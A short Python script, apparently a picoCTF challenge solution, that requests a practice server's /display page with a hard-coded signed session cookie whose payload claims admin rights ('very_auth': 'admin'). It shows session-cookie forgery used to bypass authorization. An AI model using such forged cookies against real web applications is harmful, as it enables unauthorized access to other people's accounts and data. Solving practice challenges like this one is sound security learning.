import requests

cookies = {
    'PHPSESSID': '09ooo1bn9cso7tmi5kijjc79od',
    'session': 'eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9Cg==.YJF19g.HYf5X3SfpScwGTTQ6W0xMiy5pzE',
}

headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'Accept-Language': 'en-US,en;q=0.9',
    'dnt': '1',
    'sec-gpc': '1',
}

response = requests.get('http://mercury.picoctf.net:53700/display', headers=headers, cookies=cookies, verify=False)
print(response.content)
